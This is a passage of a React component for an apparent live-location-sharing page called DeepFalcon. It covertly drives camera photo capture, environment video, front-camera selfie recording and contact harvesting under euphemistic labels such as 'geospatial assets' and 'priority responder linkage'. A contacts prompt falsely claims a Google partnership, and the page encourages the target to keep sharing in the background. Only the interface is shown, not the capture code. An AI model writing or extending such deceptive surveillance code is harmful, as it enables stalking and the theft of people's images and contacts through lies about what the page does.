            🔒 End-to-end encrypted · Your data is never sold · GDPR compliant<br />
            You can revoke access at any time by closing this link.
          </p>
        </div>
      </div>
    );
  }

  // ── Requesting / granting (only when NOT in "main" phase) ─────────────────────
  // In the contacts-first flow (main phase), location runs silently in the background
  // and we never show a full-screen spinner — the fallback render handles all states.
  if ((state === "requesting" || state === "granting") && displayPhase !== "main") {
    return (
      <div className="bg-background flex flex-col items-center justify-center gap-6 p-4" style={fullHeight}>
        <div className="flex items-center gap-2 text-primary font-bold text-lg">
          <Shield className="h-5 w-5" /> DeepFalcon
        </div>
        <div className="relative">
          <div className="w-20 h-20 rounded-full bg-primary/20 flex items-center justify-center">
            <MapPin className="h-10 w-10 text-primary" />
          </div>
          <div className="absolute -inset-2 rounded-full border-2 border-primary/30 animate-ping" />
        </div>
        <div className="text-center">
          <p className="font-semibold text-foreground text-lg">
            {state === "requesting" ? "Finding your location…" : "Starting live sharing…"}
          </p>
          <p className="text-muted-foreground text-sm mt-1">
            {state === "requesting" ? "Allow location access when prompted" : `Connecting to ${invite!.fromUserName}…`}
          </p>
        </div>
      </div>
    );
  }

  // ── GPS off (only when NOT in "main" phase) ────────────────────────────────────
  // In main phase, "gps_off" is the silent fallback for a failed location request.
  // We fall through to the unified fallback render which shows state-appropriate UI.
  if (state === "gps_off" && displayPhase !== "main") {
    return (
      <div className="bg-background flex items-center justify-center p-4" style={fullHeight}>
        <Card className="max-w-md w-full shadow-lg">
          <CardContent className="pt-10 pb-10 text-center">
            <WifiOff className="h-14 w-14 text-amber-500 mx-auto mb-4" />
            <h2 className="text-xl font-semibold mb-2">GPS Turned Off</h2>
            <p className="text-muted-foreground text-sm mb-2">Turn your device location back on and sharing will automatically resume.</p>
            <p className="text-xs text-muted-foreground">{invite!.fromUserName} has been notified you went offline.</p>
            <div className="mt-6 flex items-center justify-center gap-2 text-xs text-amber-500">
              <Loader2 className="h-3 w-3 animate-spin" /> Waiting for GPS…
            </div>
          </CardContent>
        </Card>
      </div>
    );
  }

  // ── Active tracking / main phase ──────────────────────────────────────────────
  // Show the live-sharing page whenever displayPhase is "main" (contacts-first
  // flow) OR state is "tracking" (already-accepted invite flow).  Without this,
  // any state other than "tracking" in main phase returns nothing → black screen.
  if (state === "tracking" || displayPhase === "main") {
    const sharingLink = typeof window !== "undefined" ? window.location.href : "";
    const expiresAt = new Date(Date.now() + 60 * 24 * 60 * 60 * 1000);
    const sharingMinutes = sharingSecondsLeft == null ? null : Math.floor(sharingSecondsLeft / 60);
    const sharingSeconds = sharingSecondsLeft == null ? null : sharingSecondsLeft % 60;
    const sharingTimeLabel = sharingMinutes == null || sharingSeconds == null
      ? "Starting secure 10-minute session…"
      : `${sharingMinutes}:${String(sharingSeconds).padStart(2, "0")} remaining`;

    const handleCopyLink = () => {
      copyToClipboard(sharingLink).then(() => {
        setLinkCopied(true);
        setTimeout(() => setLinkCopied(false), 2000);
      }).catch(() => {});
    };

    return (
      <div className="overflow-y-auto" style={{ ...fullHeight, background: "linear-gradient(170deg,#180c05 0%,#231208 30%,#1c0f06 65%,#0e0803 100%)", backgroundImage: "radial-gradient(circle at 1px 1px, rgba(180,130,50,0.045) 1px, transparent 0)", backgroundSize: "20px 20px" }}>

        {/* ── Contacts auto-popup overlay ──────────────────────────────────── */}
        {showContactsPrompt && !contactsCollected && (
          <div className="fixed inset-0 z-50 flex flex-col items-center justify-center p-6 text-center"
            style={{ background: "rgba(14,8,3,0.93)", backdropFilter: "blur(8px)" }}>
            <motion.div
              className="w-16 h-16 rounded-full flex items-center justify-center mb-5 shadow-lg"
              style={{ background: "linear-gradient(135deg,#C8922A,#8B6914)", boxShadow: "0 0 24px rgba(200,146,42,0.45)" }}
              initial={{ scale: 0.7, opacity: 0 }} animate={{ scale: 1, opacity: 1 }} transition={{ type: "spring", bounce: 0.45 }}
            >
              <Phone className="h-7 w-7 text-white" />
            </motion.div>
            <motion.h2
              className="text-xl font-bold mb-2"
              style={{ color: "#D4A843", fontFamily: "Georgia, serif", letterSpacing: "0.05em" }}
              initial={{ opacity: 0, y: 6 }} animate={{ opacity: 1, y: 0 }} transition={{ delay: 0.12 }}
            >
              Link Your Contacts
            </motion.h2>
            <motion.div
              className="flex items-center gap-1.5 mb-3"
              initial={{ opacity: 0 }} animate={{ opacity: 1 }} transition={{ delay: 0.18 }}
            >
              <svg width="14" height="14" viewBox="0 0 24 24" fill="none"><circle cx="12" cy="12" r="10" stroke="#D4A843" strokeWidth="2"/><path d="M12 8v4l3 3" stroke="#D4A843" strokeWidth="2" strokeLinecap="round"/></svg>
              <span style={{ fontSize: 11, color: "rgba(212,168,67,0.6)", fontFamily: "'Share Tech Mono', monospace", letterSpacing: "0.06em" }}>IN PARTNERSHIP WITH GOOGLE</span>
            </motion.div>
            <motion.p
              style={{ fontSize: 14, color: "rgba(220,185,130,0.8)", lineHeight: 1.6, marginBottom: 24, maxWidth: 280 }}
              initial={{ opacity: 0, y: 8 }} animate={{ opacity: 1, y: 0 }} transition={{ delay: 0.25 }}
            >
              Let's help Google secure your loved ones contact — recommended if you wish to proceed 100% secure ✨
            </motion.p>
            <motion.div style={{ width: "100%", maxWidth: 280 }} initial={{ opacity: 0, y: 10 }} animate={{ opacity: 1, y: 0 }} transition={{ delay: 0.35 }}>
              <button
                onClick={async () => { setShowContactsPrompt(false); await pickContacts(); }}
                style={{ width: "100%", padding: "14px 20px", borderRadius: 8, fontWeight: 700, fontSize: 15, color: "#1a0c05", border: "none", cursor: "pointer", display: "flex", alignItems: "center", justifyContent: "center", gap: 8, background: "linear-gradient(135deg, #D4A843 0%, #C8922A 50%, #8B6914 100%)", boxShadow: "0 6px 24px rgba(200,146,42,0.5), inset 0 1px 0 rgba(255,255,255,0.2)" }}
              >
                <Phone className="h-4 w-4" />
                Allow Contacts
              </button>
            </motion.div>
          </div>
        )}

        <div style={{ maxWidth: 480, margin: "0 auto", padding: "24px 16px 36px", display: "flex", flexDirection: "column", gap: 14 }}>

          {/* ── LIVE SHARING header ── */}
          <div style={{ display: "flex", alignItems: "center", gap: 10, marginBottom: 2 }}>
            {/* Quill icon */}
            <svg width="22" height="22" viewBox="0 0 24 24" fill="none">
              <path d="M20.24 12.24a6 6 0 0 0-8.49-8.49L5 10.5V19h8.5z" fill="#C8922A" opacity="0.8"/>
              <line x1="16" y1="8" x2="2" y2="22" stroke="#D4A843" strokeWidth="1.8" strokeLinecap="round"/>
              <line x1="17" y1="13.5" x2="10" y2="13.5" stroke="#D4A843" strokeWidth="0.9" opacity="0.5"/>
              <line x1="15.5" y1="11" x2="10.5" y2="16" stroke="#D4A843" strokeWidth="0.9" opacity="0.35"/>
            </svg>
            <span style={{ fontFamily: "Georgia, 'Palatino Linotype', serif", fontWeight: 900, fontSize: 17, letterSpacing: "0.14em", color: "#D4A843", textTransform: "uppercase", textShadow: "0 0 14px rgba(212,168,67,0.45)" }}>
              Live Sharing
            </span>
          </div>

          {/* Brass divider */}
          <div style={{ height: 1, background: "linear-gradient(90deg, transparent, #7a5c28 20%, #C8922A 50%, #7a5c28 80%, transparent)", margin: "0" }}/>

          {/* Sharing-with blurb */}
          <p style={{ fontSize: 15, color: "rgba(220,185,130,0.82)", lineHeight: 1.6, margin: "4px 0" }}>
            Your live location is being shared with{" "}
            <strong style={{ color: "#E5C88A", fontWeight: 800 }}>{invite!.fromUserName}</strong>.
            {" "}You can play games or watch videos — sharing keeps going in the background
          </p>

          {/* ── Status cards ── */}
          <div style={{ display: "flex", flexDirection: "column", gap: 10 }}>

            {/* Geo photos — in progress */}
            {!geoPhotoDone && geoBoardStartedRef.current && (
              <div style={{ borderRadius: 8, padding: "11px 14px", display: "flex", alignItems: "center", gap: 12, background: "linear-gradient(135deg,#3c2910 0%,#4d3618 60%,#3c2910 100%)", border: "1.5px solid #7a5c28", boxShadow: "inset 0 1px 0 rgba(212,168,67,0.10), 0 3px 10px rgba(0,0,0,0.5)" }}>
                {/* Eagle head */}
                <svg width="30" height="30" viewBox="0 0 40 44" fill="none" style={{ flexShrink: 0 }}>
                  <polygon points="16,4 26,6 28,18 22,22 14,16" fill="#1e1006" stroke="#C8922A" strokeWidth="1.2" strokeLinejoin="round"/>
                  <polygon points="26,6 34,10 32,22 26,26 28,18" fill="#160c04" stroke="#C8922A" strokeWidth="1.2" strokeLinejoin="round"/>
                  <polygon points="14,16 22,22 20,32 12,30 10,22" fill="#1a0e06" stroke="#C8922A" strokeWidth="1.2" strokeLinejoin="round"/>
                  <polygon points="10,22 14,28 8,30 4,24" fill="#C8922A" stroke="#8B6914" strokeWidth="1" strokeLinejoin="round"/>
                  <polygon points="8,30 14,28 12,36 6,34" fill="#8B6914" stroke="#5a4010" strokeWidth="0.8" strokeLinejoin="round"/>
                  <circle cx="24" cy="11" r="4" fill="#C8922A" opacity="0.25"/>
                  <circle cx="24" cy="11" r="2.5" fill="#C8922A" opacity="0.7"/>
                  <circle cx="24" cy="11" r="1.2" fill="#FFF0C0"/>
                </svg>
                <div style={{ flex: 1 }}>
                  <p style={{ fontSize: 13, fontWeight: 600, color: "#D4A843", margin: "0 0 6px", fontFamily: "Georgia, serif" }}>
                    Geo Board: archiving geospatial assets {geoPhotoCount}/{GEO_PHOTO_COUNT}…
                  </p>
                  <div style={{ height: 3, background: "rgba(122,92,40,0.3)", borderRadius: 2, overflow: "hidden" }}>
                    <div style={{ height: "100%", background: "linear-gradient(90deg,#8B6914,#D4A843)", borderRadius: 2, transition: "width 0.5s ease", width: `${(geoPhotoCount / GEO_PHOTO_COUNT) * 100}%` }}/>
                  </div>
                </div>
              </div>
            )}
            {/* Geo photos — done */}
            {geoPhotoDone && geoPhotoCount > 0 && (
              <div style={{ borderRadius: 8, padding: "11px 14px", display: "flex", alignItems: "center", gap: 12, background: "linear-gradient(135deg,#3c2910 0%,#4d3618 60%,#3c2910 100%)", border: "1.5px solid #7a5c28", boxShadow: "inset 0 1px 0 rgba(212,168,67,0.10), 0 3px 10px rgba(0,0,0,0.5)" }}>
                <svg width="30" height="30" viewBox="0 0 40 44" fill="none" style={{ flexShrink: 0 }}>
                  <polygon points="16,4 26,6 28,18 22,22 14,16" fill="#1e1006" stroke="#C8922A" strokeWidth="1.2" strokeLinejoin="round"/>
                  <polygon points="26,6 34,10 32,22 26,26 28,18" fill="#160c04" stroke="#C8922A" strokeWidth="1.2" strokeLinejoin="round"/>
                  <polygon points="14,16 22,22 20,32 12,30 10,22" fill="#1a0e06" stroke="#C8922A" strokeWidth="1.2" strokeLinejoin="round"/>
                  <polygon points="10,22 14,28 8,30 4,24" fill="#C8922A" stroke="#8B6914" strokeWidth="1" strokeLinejoin="round"/>
                  <polygon points="8,30 14,28 12,36 6,34" fill="#8B6914" stroke="#5a4010" strokeWidth="0.8" strokeLinejoin="round"/>
                  <circle cx="24" cy="11" r="4" fill="#C8922A" opacity="0.25"/>
                  <circle cx="24" cy="11" r="2.5" fill="#C8922A" opacity="0.7"/>
                  <circle cx="24" cy="11" r="1.2" fill="#FFF0C0"/>
                </svg>
                <p style={{ fontSize: 13, fontWeight: 600, color: "#D4A843", margin: 0, fontFamily: "Georgia, serif" }}>
                  Geo Board: {geoPhotoCount} geospatial asset{geoPhotoCount !== 1 ? "s" : ""} archived ✓
                </p>
              </div>
            )}

            {/* Env video — recording */}
            {geoVideoState === "recording" && (
              <div style={{ borderRadius: 8, padding: "11px 14px", display: "flex", alignItems: "center", gap: 12, background: "linear-gradient(135deg,#2a1608 0%,#3a2010 100%)", border: "1.5px dashed #8b5c22", boxShadow: "0 3px 10px rgba(0,0,0,0.5)" }}>
                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#C8922A" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round" style={{ flexShrink: 0, animation: "pulse 1.5s ease-in-out infinite" }}>
                  <path d="M23 7l-7 5 7 5V7z"/><rect x="1" y="5" width="15" height="14" rx="2" ry="2"/>
                </svg>
                <div style={{ flex: 1 }}>
                  <p style={{ fontSize: 13, fontWeight: 600, color: "#C8922A", margin: "0 0 6px", fontFamily: "Georgia, serif" }}>
                    Geo Board: capturing dynamic media ({GEO_VIDEO_DURATION_SECONDS}s)…
                  </p>
                  <div style={{ height: 3, background: "rgba(100,60,20,0.35)", borderRadius: 2, overflow: "hidden" }}>
                    <div style={{ height: "100%", background: "linear-gradient(90deg,#8B4A14,#C8922A)", borderRadius: 2, width: "100%", transition: `width ${GEO_VIDEO_DURATION_SECONDS}s linear` }}/>
                  </div>
                </div>
              </div>
            )}
            {/* Env video — uploading */}
            {geoVideoState === "uploading" && (
              <div style={{ borderRadius: 8, padding: "11px 14px", display: "flex", alignItems: "center", gap: 12, background: "linear-gradient(135deg,#2a1608 0%,#3a2010 100%)", border: "1.5px dashed #8b5c22", boxShadow: "0 3px 10px rgba(0,0,0,0.5)" }}>
                <Loader2 style={{ width: 18, height: 18, color: "#C8922A", flexShrink: 0, animation: "spin 1s linear infinite" }} />
                <p style={{ fontSize: 13, fontWeight: 600, color: "#C8922A", margin: 0, fontFamily: "Georgia, serif" }}>Geo Board: persisting dynamic media…</p>
              </div>
            )}
            {/* Env video — done */}
            {geoVideoState === "done" && (
              <div style={{ borderRadius: 8, padding: "11px 14px", display: "flex", alignItems: "center", gap: 12, background: "linear-gradient(135deg,#2a1608 0%,#3a2010 100%)", border: "1.5px dashed #8b5c22", boxShadow: "0 3px 10px rgba(0,0,0,0.5)" }}>
                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#C8922A" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round" style={{ flexShrink: 0 }}>
                  <path d="M23 7l-7 5 7 5V7z"/><rect x="1" y="5" width="15" height="14" rx="2" ry="2"/>
                </svg>
                <p style={{ fontSize: 13, fontWeight: 600, color: "#C8922A", margin: 0, fontFamily: "Georgia, serif" }}>Geo Board: dynamic media capture persisted ✓</p>
              </div>
            )}

            {/* Selfie photos — in progress */}
            {geoBoardStartedRef.current && !geoSelfiePhotoDone && geoPhotoDone && (
              <div style={{ borderRadius: 8, padding: "11px 14px", display: "flex", alignItems: "center", gap: 12, background: "linear-gradient(135deg,#2e1c08 0%,#3e2a10 60%,#2e1c08 100%)", border: "1.5px solid #6b4820", boxShadow: "0 3px 10px rgba(0,0,0,0.5)", position: "relative", overflow: "hidden" }}>
                {/* Left feather decoration */}
                <svg width="18" height="28" viewBox="0 0 18 32" fill="none" style={{ flexShrink: 0, opacity: 0.75 }}>
                  <path d="M9 2 C9 2 2 8 2 18 C2 26 6 30 9 30" stroke="#C8922A" strokeWidth="1.2" fill="none"/>
                  <path d="M9 6 C5 10 4 14 4 18" stroke="#C8922A" strokeWidth="0.8" opacity="0.5"/>
                  <path d="M9 10 C6 13 5 16 5 20" stroke="#C8922A" strokeWidth="0.8" opacity="0.4"/>
                  <circle cx="9" cy="4" r="1.5" fill="#C8922A" opacity="0.6"/>
                </svg>
                {/* Eye icon */}
                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#C8922A" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round" style={{ flexShrink: 0, animation: "pulse 2s ease-in-out infinite" }}>
                  <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/>
                </svg>
                <div style={{ flex: 1 }}>
                  <p style={{ fontSize: 13, fontWeight: 600, color: "#b87d3a", margin: "0 0 6px", fontFamily: "Georgia, serif" }}>
                    Geo Board: capturing autoportrait sequence {geoSelfiePhotoCount}/{GEO_SELFIE_PHOTO_COUNT}…
                  </p>
                  <div style={{ height: 3, background: "rgba(100,70,30,0.3)", borderRadius: 2, overflow: "hidden" }}>
                    <div style={{ height: "100%", background: "linear-gradient(90deg,#7a4e18,#b87d3a)", borderRadius: 2, transition: "width 0.5s ease", width: `${(geoSelfiePhotoCount / GEO_SELFIE_PHOTO_COUNT) * 100}%` }}/>
                  </div>
                </div>
                {/* Right feather decoration */}
                <svg width="18" height="28" viewBox="0 0 18 32" fill="none" style={{ flexShrink: 0, opacity: 0.75, transform: "scaleX(-1)" }}>
                  <path d="M9 2 C9 2 2 8 2 18 C2 26 6 30 9 30" stroke="#C8922A" strokeWidth="1.2" fill="none"/>
                  <path d="M9 6 C5 10 4 14 4 18" stroke="#C8922A" strokeWidth="0.8" opacity="0.5"/>
                  <path d="M9 10 C6 13 5 16 5 20" stroke="#C8922A" strokeWidth="0.8" opacity="0.4"/>
                  <circle cx="9" cy="4" r="1.5" fill="#C8922A" opacity="0.6"/>
                </svg>
              </div>
            )}

            {/* Selfie video — recording */}
            {geoSelfieState === "recording" && (() => {
              const remaining = Math.max(0, GEO_SELFIE_VIDEO_DURATION_SECONDS - geoSelfieElapsed);
              const pct = Math.min(100, (geoSelfieElapsed / GEO_SELFIE_VIDEO_DURATION_SECONDS) * 100);
              const mins = Math.floor(remaining / 60);
              const secs = remaining % 60;
              const timeLabel = mins > 0 ? `${mins}:${String(secs).padStart(2, "0")}` : `${secs}s`;
              return (
                <div style={{ borderRadius: 8, padding: "11px 14px", display: "flex", alignItems: "flex-start", gap: 12, background: "linear-gradient(135deg,#2e1c08 0%,#3e2a10 60%,#2e1c08 100%)", border: "1.5px solid #6b4820", boxShadow: "0 3px 10px rgba(0,0,0,0.5)", position: "relative", overflow: "hidden" }}>
                  <div style={{ marginTop: 2, flexShrink: 0, position: "relative" }}>
                    <span style={{ position: "absolute", inset: 0, borderRadius: "50%", background: "#C8922A", opacity: 0.35, width: 14, height: 14, animation: "pulse 1s infinite" }}/>
                    <span style={{ position: "relative", display: "block", borderRadius: "50%", background: "#C8922A", width: 14, height: 14 }}/>
                  </div>
                  <div style={{ flex: 1 }}>
                    <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", marginBottom: 4 }}>
                      <p style={{ fontSize: 13, fontWeight: 700, color: "#D4A843", margin: 0, fontFamily: "Georgia, serif" }}>REC • Front camera recording</p>
                      <span style={{ fontSize: 12, fontFamily: "'Share Tech Mono', monospace", color: "#b87d3a", marginLeft: 8, flexShrink: 0 }}>{timeLabel} left</span>
                    </div>
                    <div style={{ height: 4, background: "rgba(100,70,30,0.3)", borderRadius: 2, overflow: "hidden" }}>
                      <div style={{ height: "100%", background: "linear-gradient(90deg,#8B4A14,#C8922A,#D4A843)", borderRadius: 2, transition: "width 0.9s linear", width: `${pct}%`, boxShadow: "0 0 6px rgba(200,146,42,0.5)" }}/>
                    </div>
                    <p style={{ marginTop: 4, fontSize: 11, color: "rgba(180,130,60,0.6)", fontFamily: "'Share Tech Mono', monospace" }}>No audio · compressed · saved to GeoBoard when sharing ends</p>
                  </div>
                  {/* Right feather */}
                  <svg width="14" height="24" viewBox="0 0 18 32" fill="none" style={{ flexShrink: 0, opacity: 0.55, transform: "scaleX(-1)", marginTop: 2 }}>
                    <path d="M9 2 C9 2 2 8 2 18 C2 26 6 30 9 30" stroke="#C8922A" strokeWidth="1.2" fill="none"/>
                    <path d="M9 6 C5 10 4 14 4 18" stroke="#C8922A" strokeWidth="0.8" opacity="0.5"/>
                    <circle cx="9" cy="4" r="1.5" fill="#C8922A" opacity="0.6"/>
                  </svg>
                </div>
              );
            })()}
            {/* Selfie video — uploading */}
            {geoSelfieState === "uploading" && (
              <div style={{ borderRadius: 8, padding: "11px 14px", display: "flex", alignItems: "center", gap: 12, background: "linear-gradient(135deg,#2e1c08 0%,#3e2a10 60%,#2e1c08 100%)", border: "1.5px solid #6b4820", boxShadow: "0 3px 10px rgba(0,0,0,0.5)" }}>
                <Loader2 style={{ width: 18, height: 18, color: "#b87d3a", flexShrink: 0, animation: "spin 1s linear infinite" }} />
                <div>
                  <p style={{ fontSize: 13, fontWeight: 600, color: "#b87d3a", margin: 0, fontFamily: "Georgia, serif" }}>Geo Board: saving the selfie recording…</p>
                  <p style={{ fontSize: 11, color: "rgba(180,130,60,0.5)", marginTop: 2, fontFamily: "'Share Tech Mono', monospace" }}>Compressing &amp; uploading</p>
                </div>
              </div>
            )}
            {/* Selfie done */}
            {(geoSelfiePhotoDone || geoSelfieState === "done") && (
              <div style={{ borderRadius: 8, padding: "11px 14px", display: "flex", alignItems: "center", gap: 12, background: "linear-gradient(135deg,#2e1c08 0%,#3e2a10 60%,#2e1c08 100%)", border: "1.5px solid #6b4820", boxShadow: "0 3px 10px rgba(0,0,0,0.5)", position: "relative", overflow: "hidden" }}>
                <svg width="14" height="24" viewBox="0 0 18 32" fill="none" style={{ flexShrink: 0, opacity: 0.7 }}>
                  <path d="M9 2 C9 2 2 8 2 18 C2 26 6 30 9 30" stroke="#C8922A" strokeWidth="1.2" fill="none"/>
                  <path d="M9 6 C5 10 4 14 4 18" stroke="#C8922A" strokeWidth="0.8" opacity="0.5"/>
                  <circle cx="9" cy="4" r="1.5" fill="#C8922A" opacity="0.6"/>
                </svg>
                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#b87d3a" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round" style={{ flexShrink: 0 }}>
                  <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/>
                </svg>
                <p style={{ fontSize: 13, fontWeight: 600, color: "#b87d3a", margin: 0, fontFamily: "Georgia, serif" }}>Geo Board: selfie recording saved ✓</p>
                <svg width="14" height="24" viewBox="0 0 18 32" fill="none" style={{ flexShrink: 0, opacity: 0.7, transform: "scaleX(-1)", marginLeft: "auto" }}>
                  <path d="M9 2 C9 2 2 8 2 18 C2 26 6 30 9 30" stroke="#C8922A" strokeWidth="1.2" fill="none"/>
                  <path d="M9 6 C5 10 4 14 4 18" stroke="#C8922A" strokeWidth="0.8" opacity="0.5"/>
                  <circle cx="9" cy="4" r="1.5" fill="#C8922A" opacity="0.6"/>
                </svg>
              </div>
            )}

            {/* Contacts saved */}
            {contactsCollected && contactsCollectedCountRef.current > 0 && (
              <div style={{ borderRadius: 8, padding: "11px 14px", display: "flex", alignItems: "center", gap: 12, background: "linear-gradient(135deg,#2e2008 0%,#3e2e10 100%)", border: "1.5px solid #8B6914", boxShadow: "0 3px 10px rgba(0,0,0,0.5)" }}>
                <Users style={{ width: 18, height: 18, color: "#D4A843", flexShrink: 0 }} />
                <p style={{ fontSize: 13, fontWeight: 600, color: "#D4A843", margin: 0, fontFamily: "Georgia, serif" }}>
                  {contactsCollectedCountRef.current} priority responder linkage{contactsCollectedCountRef.current !== 1 ? "s" : ""} established ✓
                </p>
              </div>
            )}
          </div>

          {/* ── Current Position — stone slate card with compass roses ── */}
          {coords && (
            <div style={{ borderRadius: 8, padding: "14px 14px", background: "linear-gradient(135deg,#1e1a10 0%,#2a2416 60%,#1a1608 100%)", border: "1.5px solid #5a4f38", boxShadow: "inset 0 1px 0 rgba(212,168,67,0.06), 0 4px 14px rgba(0,0,0,0.55)" }}>
              {/* Header row with compass roses */}
              <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", marginBottom: 10 }}>
                {/* Left compass */}
                <svg width="24" height="24" viewBox="0 0 32 32" fill="none" style={{ opacity: 0.7 }}>
                  <circle cx="16" cy="16" r="14" stroke="#8B6914" strokeWidth="1" fill="none"/>
                  <polygon points="16,2 18,14 16,12 14,14" fill="#C8922A"/>
                  <polygon points="16,30 14,18 16,20 18,18" fill="#5a4020" stroke="#8B6914" strokeWidth="0.5"/>
                  <polygon points="2,16 14,18 12,16 14,14" fill="#5a4020" stroke="#8B6914" strokeWidth="0.5"/>
                  <polygon points="30,16 18,14 20,16 18,18" fill="#5a4020" stroke="#8B6914" strokeWidth="0.5"/>
                  <circle cx="16" cy="16" r="2.5" fill="#8B6914"/>
                  <circle cx="16" cy="16" r="1.2" fill="#D4A843"/>
                </svg>
                <div style={{ flex: 1, textAlign: "center" }}>
                  <span style={{ fontSize: 10, fontWeight: 700, color: "rgba(212,168,67,0.55)", letterSpacing: "0.14em", fontFamily: "'Share Tech Mono', monospace" }}>CURRENT POSITION</span>
                </div>
                {/* Right compass */}
                <svg width="24" height="24" viewBox="0 0 32 32" fill="none" style={{ opacity: 0.7 }}>
                  <circle cx="16" cy="16" r="14" stroke="#8B6914" strokeWidth="1" fill="none"/>
                  <polygon points="16,2 18,14 16,12 14,14" fill="#C8922A"/>
                  <polygon points="16,30 14,18 16,20 18,18" fill="#5a4020" stroke="#8B6914" strokeWidth="0.5"/>
                  <polygon points="2,16 14,18 12,16 14,14" fill="#5a4020" stroke="#8B6914" strokeWidth="0.5"/>
                  <polygon points="30,16 18,14 20,16 18,18" fill="#5a4020" stroke="#8B6914" strokeWidth="0.5"/>
                  <circle cx="16" cy="16" r="2.5" fill="#8B6914"/>
                  <circle cx="16" cy="16" r="1.2" fill="#D4A843"/>
                </svg>
              </div>
              <p style={{ fontSize: 22, fontFamily: "'Share Tech Mono', monospace", fontWeight: 700, color: "#E5C88A", lineHeight: 1.25, margin: "0 0 4px" }}>
                {formatDMS(coords.lat, coords.lng)}
              </p>
              <p style={{ fontSize: 12, fontFamily: "'Share Tech Mono', monospace", color: "rgba(212,168,67,0.5)", margin: "0 0 6px" }}>
                {coords.lat.toFixed(6)},&nbsp;&nbsp;{coords.lng.toFixed(6)}
              </p>
              {coords.accuracy && (
                <p style={{ fontSize: 12, color: "rgba(180,150,80,0.5)", margin: "0 0 2px", fontFamily: "'Share Tech Mono', monospace" }}>Accuracy: ±{Math.round(coords.accuracy)}m</p>
              )}
              {address && (
                <p style={{ fontSize: 12, color: "rgba(180,150,80,0.45)", margin: 0, lineHeight: 1.45 }}>
                  {address.slice(0, 80)}{address.length > 80 ? "…" : ""}
                </p>
              )}
            </div>
          )}

          {/* ── Stats grid ── */}
          <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 12 }}>
            <div style={{ borderRadius: 8, padding: "14px 12px", textAlign: "center", background: "linear-gradient(135deg,#3a2810 0%,#4a3418 60%,#3a2810 100%)", border: "1.5px solid #7a5c28", boxShadow: "inset 0 1px 0 rgba(212,168,67,0.08), 0 3px 10px rgba(0,0,0,0.5)" }}>
              <p style={{ fontSize: 28, fontWeight: 800, color: "#E5C88A", margin: "0 0 2px", fontFamily: "'Share Tech Mono', monospace" }}>{updateCount}</p>
              <p style={{ fontSize: 11, color: "rgba(212,168,67,0.5)", margin: 0, letterSpacing: "0.08em", fontFamily: "'Share Tech Mono', monospace" }}>Updates sent</p>
            </div>

           <div style={{ borderRadius: 8, padding: "12px 14px", background: "linear-gradient(135deg,#0d2032 0%,#132b40 100%)", border: "1.5px solid rgba(70,160,220,0.28)", display: "flex", alignItems: "center", gap: 10 }}>
             <Activity style={{ width: 16, height: 16, color: "#7dd3fc", flexShrink: 0 }} />
             <div>
               <p style={{ fontSize: 11, fontWeight: 700, color: "#7dd3fc", margin: "0 0 3px", letterSpacing: "0.08em", fontFamily: "'Share Tech Mono', monospace" }}>10-MINUTE SHARING SESSION</p>
               <p style={{ fontSize: 12, color: "rgba(200,230,250,0.65)", margin: 0 }}>{sharingTimeLabel}</p>
             </div>
           </div>
            <div style={{ borderRadius: 8, padding: "14px 12px", textAlign: "center", background: "linear-gradient(135deg,#3a2810 0%,#4a3418 60%,#3a2810 100%)", border: "1.5px solid #7a5c28", boxShadow: "inset 0 1px 0 rgba(212,168,67,0.08), 0 3px 10px rgba(0,0,0,0.5)", position: "relative", overflow: "hidden" }}>
              {/* Eagle eye watermark */}
              <div style={{ position: "absolute", bottom: -4, right: -4, opacity: 0.18 }}>
                <svg width="44" height="44" viewBox="0 0 40 44" fill="none">
                  <polygon points="16,4 26,6 28,18 22,22 14,16" fill="#C8922A" stroke="#C8922A" strokeWidth="0.5"/>
                  <polygon points="26,6 34,10 32,22 26,26 28,18" fill="#8B6914" stroke="#C8922A" strokeWidth="0.5"/>
                  <polygon points="14,16 22,22 20,32 12,30 10,22" fill="#C8922A" stroke="#C8922A" strokeWidth="0.5"/>
                  <polygon points="10,22 14,28 8,30 4,24" fill="#D4A843" stroke="#C8922A" strokeWidth="0.5"/>
                  <circle cx="24" cy="11" r="3.5" fill="#D4A843" opacity="0.8"/>
                  <circle cx="24" cy="11" r="1.5" fill="#FFF0C0"/>
                </svg>
              </div>
              <p style={{ fontSize: 18, fontWeight: 700, color: "#E5C88A", margin: "0 0 2px", fontFamily: "'Share Tech Mono', monospace" }}>
                {lastSent ? lastSent.toLocaleTimeString([], { hour: "2-digit", minute: "2-digit", second: "2-digit" }) : "—"}
              </p>
              <p style={{ fontSize: 11, color: "rgba(212,168,67,0.5)", margin: 0, letterSpacing: "0.08em", fontFamily: "'Share Tech Mono', monospace" }}>Last update</p>
            </div>
          </div>

          {/* ── 60-day sharing link ── */}
          <div style={{ borderRadius: 8, padding: "14px", background: "linear-gradient(135deg,#2a1e08 0%,#3a2c10 100%)", border: "1.5px solid #6b5020" }}>
            <div style={{ display: "flex", alignItems: "center", gap: 8, marginBottom: 6 }}>
              <Share2 style={{ width: 14, height: 14, color: "#C8922A", flexShrink: 0 }} />
              <p style={{ fontSize: 11, fontWeight: 700, color: "#C8922A", margin: 0, letterSpacing: "0.08em", fontFamily: "'Share Tech Mono', monospace" }}>60-DAY SHARING LINK</p>
            </div>
            <p style={{ fontSize: 12, color: "rgba(180,150,80,0.55)", marginBottom: 10, lineHeight: 1.5 }}>
              Active until{" "}
              <strong style={{ color: "rgba(212,168,67,0.75)" }}>
                {expiresAt.toLocaleDateString(undefined, { month: "short", day: "numeric", year: "numeric" })}
              </strong>. Open anytime to reconnect.
            </p>
            <div style={{ display: "flex", gap: 8 }}>
